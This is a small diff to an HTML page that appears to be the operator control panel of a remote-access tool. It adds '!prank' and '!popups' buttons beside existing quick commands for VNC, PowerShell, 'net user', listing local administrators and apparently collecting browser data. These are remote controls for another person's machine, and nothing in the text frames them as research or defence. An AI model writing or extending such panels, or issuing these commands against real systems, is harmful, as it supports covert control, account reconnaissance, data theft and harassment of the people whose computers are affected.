@@ -1106,6 +1106,8 @@ header{height:58px;display:flex;align-items:center;gap:0;padding:0 14px;flex-shr
         <button class="qcmd" onclick="cmdInsert('!vnc ')">vnc</button>
         <button class="qcmd" onclick="cmdInsert('ps1 ')">ps1</button>
         <button class="qcmd" onclick="sendCmd('psreset')">psreset</button>
+        <button class="qcmd" onclick="cmdInsert('!prank ')">prank</button>
+        <button class="qcmd" onclick="sendCmd('!popups')">popups</button>
         <button class="qcmd" onclick="sendCmd('net user')">net user</button>
         <button class="qcmd" onclick="sendCmd('net localgroup administrators')">local admins</button>
         <button class="qcmd" onclick="sendCmd('!browser')">browsers</button>
